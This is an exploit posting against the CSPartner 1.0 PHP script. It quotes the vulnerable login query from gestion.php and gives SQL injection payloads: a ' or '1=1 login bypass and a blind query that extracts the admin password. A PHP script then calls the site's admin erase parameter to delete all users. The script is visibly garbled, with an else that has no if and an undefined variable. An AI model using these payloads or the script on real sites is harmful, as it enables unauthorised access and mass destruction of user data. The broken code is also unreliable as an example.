CSPartner 1.0 (Delete All Users/SQL Injection) Remote Exploit
=============================================================


<?php

/*

   CSPartner 1.0 (Delete All Users/SQL Injection) Remote Exploit
   ----------------------------------------------------------------
   By StAkeR
   http://www.easy-script.com/scripts-dl/cspartne-01.zip
   ----------------------------------------------------------------
   
   File gestion.php
   
   5. if(!empty($_POST["pseudo"]) && !empty($_POST["passe"])){
   6. $sql  = "SELECT * FROM $tblPartner where pseudo=&#039;".$_POST["pseudo"]."&#039; AND password=&#039;".$_POST["passe"]."&#039;";
   7. $resultat = mysql_db_query($mydbPartner, $sql);
   
   Blind SQL Injection or Login ByPass for you :P
   
   Examples: ($_POST[&#039;pseudo&#039;] and $_POST[&#039;passe&#039;])
   
  -1 &#039; or &#039;1=1
  -2 &#039; or ascii(substring((select password from CSPartner where id=1),1,1))=[97]/*
  -3 and other :D
  
   
   
*/


error_reporting(0);

$host = $argv[1] or die("Usage: php [exploit.php] [http://localhost/cms]\n");

{
  for($i=0;$i<=count($out);$i++)
  {
    file_get_contents($host.&#039;/admin/index.php?erase=&#039;.$out[1][$i]);
  }
    echo "[-] All Users Deleted\n";
}
else
{
  echo "[-] Exploit Failed!\n";
}



